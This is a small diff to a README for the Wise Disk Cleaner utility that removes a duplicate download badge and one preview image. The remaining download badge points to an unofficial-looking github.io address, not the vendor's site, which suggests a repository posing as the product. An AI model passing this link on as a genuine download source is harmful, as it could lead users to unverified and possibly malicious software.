@@ -3,7 +3,7 @@
 Wise Disk Cleaner is a lightweight yet powerful utility for removing junk files, system residues, and unnecessary clutter from your PC. It helps optimize disk usage, free up valuable space, and boost system performance — all with just a few clicks.
 
 [![Download Wise Disk Cleaner](https://img.shields.io/badge/Download-Wise_Disk_Cleaner-blueviolet)](https://wise-disk-cleaner-pro.github.io/.github)  
-[![Download Wise Disk Cleaner](https://img.shields.io/badge/Download-Wise_Disk_Cleaner-blueviolet)](https://wise-disk-cleaner-pro.github.io/.github)
+
 
 ---
 
@@ -59,7 +59,7 @@ Wise Disk Cleaner is a lightweight yet powerful utility for removing junk files,
 
 ### 🖼 Preview
 
-![Interface](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQuEBGqqMSn4q1rkVpWGcOML7i-tSH7anXZNA&s)  
+ 
 ![Main Panel](https://www.wisecleaner.com/help/wisediskcleaner/assets/wdc-main.png)
 
 ---
